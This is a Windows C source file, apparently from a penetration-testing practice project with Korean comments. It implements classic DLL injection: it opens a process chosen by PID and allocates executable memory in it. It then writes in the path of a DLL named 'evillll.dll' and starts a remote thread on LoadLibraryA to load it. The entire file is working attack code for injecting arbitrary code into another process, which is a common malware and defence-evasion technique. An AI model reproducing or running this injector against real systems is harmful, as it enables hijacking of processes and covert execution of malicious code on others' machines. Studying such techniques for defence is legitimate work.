#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>


char evilDLL[] = "C:\\Users\\adusg\\source\\repos\\pentest\\DLL_Inejction_1\\DLL_Inejction_1\\evillll.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
    HANDLE ph; 
    HANDLE rt; 
    LPVOID rb; 

    // kernel32 모듈에 대한 핸들값 검색
    HMODULE hKernel32 = GetModuleHandle("Kernel32"); 
    VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA"); //모듈의 핸들 통해서 Kernel32.dll의 핸들값 얻어옴. 그리고 모듈 안에서 LoadLibraryA 함수를 찾고자 하는 것.

    // PID찾기!
    if (atoi(argv[1]) == 0) {
        printf("PID not found :( exiting...\n");
        return -1;
    }
    printf("PID: %i", atoi(argv[1]));
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    rb = VirtualAllocEx(ph, NULL, evilLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

    // 새로운 스레드 생성
    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
    CloseHandle(ph);
    return 0;
}